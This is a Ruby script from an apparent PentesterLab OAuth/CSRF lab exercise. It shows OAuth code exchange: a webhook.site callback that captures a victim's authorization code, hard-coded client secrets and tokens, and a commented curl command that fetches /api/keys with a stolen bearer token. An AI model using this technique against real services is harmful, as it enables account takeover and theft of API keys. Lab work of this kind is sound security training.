# This site is part of the CSRF lab for the pentester lab. Here I was able to use the webhook.site to get the code that was needed for the curl command at the bottom. I also used repl.it to host the malicious site rather than my own localserver.


require 'oauth2'

callback = "https://webhook.site/58173637-3ad0-4489-9034-128f6fe4269b"
app_id = "6aba1134ecde52a583acf315dfa981a52aa375fb84fbb570359293c234f10494"

secret = "eb7f038ad30dd047b64a90bdcfe1aab63b390f7d06f4d6fd31f6cd0e5de3aca5"
client = OAuth2::Client.new(app_id, secret, site: "http://authorization-ptl-402e9b14-540bfe3a.libcurl.so")
client.auth_code.authorize_url(redirect_uri: callback)
# exit

code="f120b0649aef89f6139ed4279d21d3e5ada8dd6c3f1db012e1a964410b0c1a2d"
access = client.auth_code.get_token( code, redirect_uri: callback)
access.get("/api/user").parsed

puts access.token  


# curl -H 'Authorization: Bearer 0f97433e6f17f527d2e969e114cca6170af105161d32560ea740a82d34c27b38' http://resource-ptl-402e9b14-540bfe3a.libcurl.so/api/keys --dump-header -